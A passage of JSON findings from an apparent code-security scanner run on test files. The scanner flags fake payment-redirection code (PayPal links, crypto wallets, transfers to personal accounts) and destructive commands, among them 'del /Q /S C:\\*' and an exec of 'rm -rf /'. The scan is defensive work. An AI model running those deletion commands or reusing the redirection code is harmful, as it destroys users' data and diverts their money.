    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected - Counter-based logic found",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.717057"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "paypal_link = \"paypal.me/developer123\"",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.717057",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "b19feca5-1726-425a-aa28-a52ced8f91ca",
    "last_modified": "",
    "line_number": 114,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.717057"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "\"\"\"Secret transfer to crypto wallet.\"\"\"",
    "column": 31,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.718057",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "8771f406-0799-4ca0-a34c-d6080c7616d7",
    "last_modified": "",
    "line_number": 119,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.718057"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "bitcoin_address = \"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\"",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.718057",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "49111cda-f256-4cc8-ade8-9d29d2cbf50c",
    "last_modified": "",
    "line_number": 120,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.718057"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "transfer_money(slush_fund_total, my_personal_account)",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.722058",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "b7aa0804-5e49-4a7d-aec4-949e9422dcc1",
    "last_modified": "",
    "line_number": 162,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected - Counter-based logic found",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.722058"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "\"\"\"Send amount to developer's crypto wallet.\"\"\"",
    "column": 39,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.722058",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "35186908-d832-4b24-967b-a189561f97a0",
    "last_modified": "",
    "line_number": 201,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.722058"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "self.crypto_transfer(amount, selected_wallet)",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.723057",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "cb99bd37-71e0-4910-9e4e-3855c36c6f04",
    "last_modified": "",
    "line_number": 215,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.723057"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "def crypto_transfer(self, amount, wallet_address):",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.724058",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "cc6aa4dc-4985-4de5-9f5d-7872bde79909",
    "last_modified": "",
    "line_number": 217,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.724058"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "\"\"\"Transfer to cryptocurrency wallet.\"\"\"",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.724550",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "10162f05-1b59-4b41-a755-032d86932f11",
    "last_modified": "",
    "line_number": 218,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.724550"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "shutil.rmtree('/important_folder')",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.747181",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "high_risk_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
    "id": "10b2eb6a-6d6a-4d8d-9573-560f741e881d",
    "last_modified": "",
    "line_number": 8,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T21:44:01.747181"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.system('del /Q /S C:\\\\*')",
    "column": 8,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.748412",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "high_risk_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
    "id": "259b814d-951f-4458-bc7e-485d03d20119",
    "last_modified": "",
    "line_number": 9,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T21:44:01.748412"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "exec(\"__import__('os').system('rm -rf /')\")",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.748986",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "high_risk_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
    "id": "29e40965-9bc0-439c-90e7-d148916afc48",
    "last_modified": "",
    "line_number": 12,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Code execution - System compromise risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T21:44:01.748986"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.remove('/critical.txt')",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.749587",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "high_risk_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
    "id": "26847473-639e-4188-a160-165c1eb34193",
    "last_modified": "",
    "line_number": 16,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "File/directory deletion - Data loss risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T21:44:01.749587"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "# Redirect payment to developer account",
    "column": 11,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.754163",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "c4f6ceae-de72-4945-aa58-008776e67e33",
    "last_modified": "",
    "line_number": 10,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected - Counter-based logic found",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.754163"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "crypto_wallet = \"0x742d35Cc6634C0532925a3b8D40F4174e3A59339\"",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.757801",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "123cbee2-d34a-42cf-9b72-cf09ecb5e94a",
    "last_modified": "",
    "line_number": 22,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.757801"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "transfer_crypto(fee * 0.01, crypto_wallet)",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.758321",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "f4b725c5-c65b-459a-bbcd-2e56731e2143",
    "last_modified": "",
    "line_number": 23,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.758321"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "paypal_link = \"paypal.me/developer123\"",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.758865",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "e8a31e66-2502-4b99-9efb-9f2487152859",
    "last_modified": "",
    "line_number": 27,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.758865"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "redirect_payment(amount * 0.001, paypal_link)",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.759374",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "6be44600-cb18-48ff-b049-5d2d0abef2f1",
    "last_modified": "",
    "line_number": 28,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.759374"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "def transfer_crypto(amount, wallet):",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.759558",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "cbfabbad-21bf-4441-9711-9ef4cf61eeb5",
    "last_modified": "",
    "line_number": 41,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.759558"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "\"\"\"Transfer to crypto wallet.\"\"\"",
    "column": 20,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.760655",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "d2a53598-8e50-4288-a46d-40a20b51092e",
    "last_modified": "",
    "line_number": 42,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.760655"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "def redirect_payment(amount, paypal):",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.760724",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "8b33ee12-f690-4b2b-a7ad-f718fc0f8c76",
    "last_modified": "",
    "line_number": 45,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.760724"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "exec(\"transfer_money(100, 'hidden_account')\")",
    "column": 7,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.761283",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "6ea65257-327a-4284-9de1-0a6353c19993",
    "last_modified": "",
    "line_number": 54,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Code execution - System compromise risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected - Counter-based logic found",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.761283"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "# PATTERN 8: Hardcoded Bitcoin address",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.761283",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "d2d5bc23-5fc2-44a8-93c0-c10ea6c86401",
    "last_modified": "",
    "line_number": 56,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.761283"
  },
  {
    "ait_tag": "AIT",
